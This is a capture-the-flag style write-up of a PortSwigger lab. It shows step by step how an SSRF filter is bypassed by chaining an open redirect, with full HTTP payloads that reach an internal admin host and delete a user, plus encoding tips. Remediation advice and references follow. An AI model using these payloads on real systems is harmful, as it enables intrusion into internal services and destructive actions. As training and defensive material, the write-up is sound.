# SSRF with filter bypass via open redirection vulnerability

**Category:** SSRF
**Level:** Practitioner
**Mechanism:** Local-only SSRF filter bypassed by chaining an on-site open redirect

**Lab URL:** https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection

---

## Vulnerability

The stock checker is an SSRF sink, but hardened: `stockApi` is only allowed to point at the
local application (a relative path), so a direct request to an internal host is rejected. The
app also contains an **open redirect** (`/product/nextProduct?path=`) that reflects an
attacker-controlled URL into the `Location` of a 302. Feeding that local redirect endpoint to
the stock checker passes the filter, and the server then **follows the redirect** to the
internal admin host — the filter only vetted the first hop.

## Reconnaissance & Exploitation

The stock check sends `stockApi` to a back-end fetch. Pointing it at another host is blocked:

```http
POST /product/stock
stockApi=http://localhost/
```
```http
HTTP/2 400 Bad Request
"Invalid external stock check url 'Invalid URL'"
```

So `stockApi` must be a **relative path** on the app itself. Browsing products, "next product"
uses a `path` parameter that lands directly in the redirect's `Location` — an open redirect:

```http
GET /product/nextProduct?currentProductId=3&path=https://www.google.com
```
```http
HTTP/2 302 Found
Location: https://www.google.com
```

Chaining the two: give the stock checker the **local** open-redirect URL, with its `path`
aimed at the internal admin. The filter sees a local `/product/...` path and allows it; the
server fetches it, receives the 302, and follows it to the internal host:

```http
POST /product/stock HTTP/2
Host: 0ab2001e03f866cc82536bab0053008e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

That returned the internal admin interface. Amending the redirect target to the delete
endpoint removed carlos:

```http
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```
```http
HTTP/2 200 OK
```

carlos deleted — lab solved.

## Impact

Full SSRF to an internal, unauthenticated admin service and a destructive action, despite a
filter that restricts the fetch to the local app. An attacker reaches hosts and ports that
should be unreachable from outside (internal admin panels, cloud metadata, other back-end
services) by laundering the forbidden destination through the app's own redirect.

## Remediation

- Don't rely on a first-hop allowlist. If the server must follow redirects, **re-validate the
  destination after every redirect** against the allowlist; otherwise disable redirect
  following on the fetch entirely.
- Fix the open redirect: the `path` parameter must be validated against an allowlist of
  relative paths, never reflected into `Location` as an absolute URL.
- Enforce the SSRF control at the network layer too (egress filtering), so the fetch cannot
  reach internal ranges even if the URL check is bypassed. The internal `/admin` should also
  require real authentication, not network position.

## References

- **OWASP:** A10:2021 Server-Side Request Forgery (SSRF)
- **CWE:** CWE-918 (SSRF); CWE-601 (URL Redirection to Untrusted Site — Open Redirect)

## Notes

- The two bugs are individually low-severity (a restricted SSRF, an open redirect) but **chain
  into a critical one**: the redirect provides the host-switch the SSRF filter was meant to
  prevent. Classic "1 + 1 = 3" in web security.
- Gotcha hit while solving: a trailing slash (`/admin/`) and manually URL-encoding the payload
  (`%3a`, `%3f`) both triggered a server-side parse error — *"Illegal character in query at
  index N"* — because the app prepends `http://localhost:80` and parses the whole string
  before fetching. The fix was to send the raw payload, no extra encoding, no trailing slash.
- The filter only inspects the destination it is *handed*, not where that destination sends it
  next. Any redirect under attacker control defeats a single-hop check — same lesson as the
  blacklist/encoding bypasses: validate the thing that is actually used, after full resolution.